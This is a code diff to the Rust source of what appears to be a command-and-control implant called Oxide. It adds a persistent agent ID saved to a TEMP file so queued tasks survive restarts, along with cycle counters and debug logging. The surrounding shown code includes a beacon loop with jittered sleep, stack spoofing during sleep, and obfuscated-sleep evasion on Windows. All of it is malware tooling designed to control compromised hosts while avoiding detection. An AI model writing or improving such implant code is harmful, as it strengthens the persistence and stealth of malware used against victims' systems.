@@ -11,9 +11,28 @@ use oxide_common::types::{AgentTask, Privilege};
 use rand::Rng;
 use uuid::Uuid;
 
+fn stable_agent_id() -> Uuid {
+    // Reuse the same UUID across restarts so queued tasks survive a crash/rerun.
+    let id_path = {
+        let tmp = std::env::var("TEMP")
+            .or_else(|_| std::env::var("TMP"))
+            .unwrap_or_else(|_| "C:\\Temp".into());
+        std::path::PathBuf::from(tmp).join("oxide_id.bin")
+    };
+    if let Ok(bytes) = std::fs::read(&id_path) {
+        if bytes.len() == 16 {
+            let arr: [u8; 16] = bytes.try_into().unwrap();
+            return Uuid::from_bytes(arr);
+        }
+    }
+    let id = Uuid::new_v4();
+    let _ = std::fs::write(&id_path, id.as_bytes());
+    id
+}
+
 pub async fn run(cfg: AgentConfig) -> Result<()> {
     // Collect system info
-    let agent_id  = Uuid::new_v4();
+    let agent_id  = stable_agent_id();
     let hostname  = hostname();
     let username  = username();
     let ip        = local_ip();
@@ -66,8 +85,10 @@ pub async fn run(cfg: AgentConfig) -> Result<()> {
 
     // Main beacon loop
     let mut pending_results: Vec<AgentResult> = Vec::new();
+    let mut cycle: u64 = 0;
 
     loop {
+        cycle += 1;
         // Sleep with jitter
         let jitter = {
             let pct = cfg.jitter_pct as f64 / 100.0;
@@ -76,6 +97,7 @@ pub async fn run(cfg: AgentConfig) -> Result<()> {
             j
         };
         let sleep_ms = cfg.sleep_ms.saturating_add(jitter);
+        crate::dbg_log!("cycle {cycle}: sleeping {}ms", sleep_ms);
 
         // Stack spoof guard during sleep
         #[cfg(target_os = "windows")]
@@ -86,6 +108,7 @@ pub async fn run(cfg: AgentConfig) -> Result<()> {
         };
 
         evasion::obfuscated_sleep(sleep_ms, &cfg.sleep_obf).await;
+        crate::dbg_log!("cycle {cycle}: awoke");
 
         // Drop guard before beacon (stack must be real for I/O)
         #[cfg(target_os = "windows")]
